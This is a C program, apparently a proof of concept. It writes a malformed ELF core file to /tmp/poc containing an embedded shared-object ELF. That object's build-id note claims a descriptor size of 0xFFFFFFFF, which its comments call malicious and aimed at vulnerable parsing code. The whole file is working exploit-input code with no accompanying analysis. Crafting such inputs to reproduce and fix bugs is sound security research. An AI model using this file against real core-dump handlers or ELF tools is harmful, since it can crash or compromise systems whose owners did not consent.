#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define EI_NIDENT 16
#define PT_NOTE 4
#define PT_LOAD 1
#define PF_R 4
#define PF_W 2
#define PF_X 1
#define ET_CORE 4
#define EM_X86_64 62
#define EV_CURRENT 1
#define ELFCLASS64 2
#define ELFDATA2LSB 1
#define NT_GNU_BUILD_ID 3
#define ET_DYN 3

/* Embedded ELF structure (64-bit shared library) */
typedef struct {
    unsigned char e_ident[EI_NIDENT];
    uint16_t e_type;
    uint16_t e_machine;
    uint32_t e_version;
    uint64_t e_entry;
    uint64_t e_phoff;
    uint64_t e_shoff;
    uint32_t e_flags;
    uint16_t e_ehsize;
    uint16_t e_phentsize;
    uint16_t e_phnum;
    uint16_t e_shentsize;
    uint16_t e_shnum;
    uint16_t e_shstrndx;
} Elf64_Ehdr;

typedef struct {
    uint32_t p_type;
    uint32_t p_flags;
    uint64_t p_offset;
    uint64_t p_vaddr;
    uint64_t p_paddr;
    uint64_t p_filesz;
    uint64_t p_memsz;
    uint64_t p_align;
} Elf64_Phdr;

static void write_u16(FILE *f, uint16_t v) {
    fputc(v & 0xff, f);
    fputc((v >> 8) & 0xff, f);
}

static void write_u32(FILE *f, uint32_t v) {
    fputc(v & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 24) & 0xff, f);
}

static void write_u64(FILE *f, uint64_t v) {
    fputc(v & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 32) & 0xff, f);
    fputc((v >> 40) & 0xff, f);
    fputc((v >> 48) & 0xff, f);
    fputc((v >> 56) & 0xff, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Outer core file ELF64 header */
    Elf64_Ehdr outer_ehdr;
    memset(&outer_ehdr, 0, sizeof(outer_ehdr));
    outer_ehdr.e_ident[0] = 0x7f;
    outer_ehdr.e_ident[1] = 'E';
    outer_ehdr.e_ident[2] = 'L';
    outer_ehdr.e_ident[3] = 'F';
    outer_ehdr.e_ident[4] = ELFCLASS64;
    outer_ehdr.e_ident[5] = ELFDATA2LSB;
    outer_ehdr.e_ident[6] = EV_CURRENT;
    outer_ehdr.e_type = ET_CORE;
    outer_ehdr.e_machine = EM_X86_64;
    outer_ehdr.e_version = EV_CURRENT;
    outer_ehdr.e_phoff = sizeof(Elf64_Ehdr);
    outer_ehdr.e_ehsize = sizeof(Elf64_Ehdr);
    outer_ehdr.e_phentsize = sizeof(Elf64_Phdr);
    outer_ehdr.e_phnum = 2;

    fwrite(&outer_ehdr, 1, sizeof(outer_ehdr), f);

    /* Outer PT_LOAD: covers the embedded ELF at vaddr 0x7f0000000000 */
    Elf64_Phdr outer_phdr_load;
    memset(&outer_phdr_load, 0, sizeof(outer_phdr_load));
    outer_phdr_load.p_type = PT_LOAD;
    outer_phdr_load.p_flags = PF_R | PF_W | PF_X;
    outer_phdr_load.p_offset = 0;
    outer_phdr_load.p_vaddr = 0x7f0000000000;
    outer_phdr_load.p_paddr = 0x7f0000000000;
    outer_phdr_load.p_filesz = 4096;
    outer_phdr_load.p_memsz = 4096;
    outer_phdr_load.p_align = 0x1000;
    fwrite(&outer_phdr_load, 1, sizeof(outer_phdr_load), f);

    /* Outer PT_NOTE (dummy, not used by vulnerable code) */
    Elf64_Phdr outer_phdr_note;
    memset(&outer_phdr_note, 0, sizeof(outer_phdr_note));
    outer_phdr_note.p_type = PT_NOTE;
    outer_phdr_note.p_flags = PF_R;
    outer_phdr_note.p_offset = sizeof(Elf64_Ehdr) + 2 * sizeof(Elf64_Phdr);
    outer_phdr_note.p_filesz = 128;
    outer_phdr_note.p_memsz = 128;
    outer_phdr_note.p_align = 4;
    fwrite(&outer_phdr_note, 1, sizeof(outer_phdr_note), f);

    /* Outer PT_NOTE data (dummy) */
    for (int i = 0; i < 128; i++) {
        fputc(0x00, f);
    }

    /* Now write the embedded ELF inside the PT_LOAD segment area */
    /* The embedded ELF is a minimal shared library with its own PT_NOTE */

    /* Embedded ELF header */
    Elf64_Ehdr inner_ehdr;
    memset(&inner_ehdr, 0, sizeof(inner_ehdr));
    inner_ehdr.e_ident[0] = 0x7f;
    inner_ehdr.e_ident[1] = 'E';
    inner_ehdr.e_ident[2] = 'L';
    inner_ehdr.e_ident[3] = 'F';
    inner_ehdr.e_ident[4] = ELFCLASS64;
    inner_ehdr.e_ident[5] = ELFDATA2LSB;
    inner_ehdr.e_ident[6] = EV_CURRENT;
    inner_ehdr.e_type = ET_DYN;
    inner_ehdr.e_machine = EM_X86_64;
    inner_ehdr.e_version = EV_CURRENT;
    inner_ehdr.e_phoff = sizeof(Elf64_Ehdr);
    inner_ehdr.e_ehsize = sizeof(Elf64_Ehdr);
    inner_ehdr.e_phentsize = sizeof(Elf64_Phdr);
    inner_ehdr.e_phnum = 2;
    fwrite(&inner_ehdr, 1, sizeof(inner_ehdr), f);

    /* Inner PT_LOAD (for the embedded ELF itself) */
    Elf64_Phdr inner_phdr_load;
    memset(&inner_phdr_load, 0, sizeof(inner_phdr_load));
    inner_phdr_load.p_type = PT_LOAD;
    inner_phdr_load.p_flags = PF_R | PF_X;
    inner_phdr_load.p_offset = 0;
    inner_phdr_load.p_vaddr = 0x7f0000000000;
    inner_phdr_load.p_paddr = 0x7f0000000000;
    inner_phdr_load.p_filesz = 256;
    inner_phdr_load.p_memsz = 256;
    inner_phdr_load.p_align = 0x1000;
    fwrite(&inner_phdr_load, 1, sizeof(inner_phdr_load), f);

    /* Inner PT_NOTE with malicious build-id note */
    Elf64_Phdr inner_phdr_note;
    memset(&inner_phdr_note, 0, sizeof(inner_phdr_note));
    inner_phdr_note.p_type = PT_NOTE;
    inner_phdr_note.p_flags = PF_R;
    inner_phdr_note.p_offset = sizeof(Elf64_Ehdr) + 2 * sizeof(Elf64_Phdr);
    inner_phdr_note.p_vaddr = 0x7f0000000000 + sizeof(Elf64_Ehdr) + 2 * sizeof(Elf64_Phdr);
    inner_phdr_note.p_filesz = 256;
    inner_phdr_note.p_memsz = 256;
    inner_phdr_note.p_align = 4;
    fwrite(&inner_phdr_note, 1, sizeof(inner_phdr_note), f);

    /* Inner PT_NOTE data */
    /* Note header: 12 bytes (3 x uint32) */
    write_u32(f, 4);              /* n_namesz = 4 */
    write_u32(f, 0xFFFFFFFF);     /* n_descsz = 0xFFFFFFFF */
    write_u32(f, NT_GNU_BUILD_ID); /* n_type = 3 */
    /* Name: "GNU" (4 bytes) */
    fwrite("GNU", 1, 4, f);
    /* Padding to 8-byte alignment (4 bytes) */
    for (int i = 0; i < 4; i++) {
        fputc(0x00, f);
    }
    /* Fill remaining bytes */
    for (int i = 0; i < 232; i++) {
        fputc(0x00, f);
    }

    /* Fill remaining PT_LOAD space (4096 - 256 = 3840 bytes) */
    for (int i = 0; i < 3840; i++) {
        fputc(0x00, f);
    }

    fclose(f);
    return 0;
}

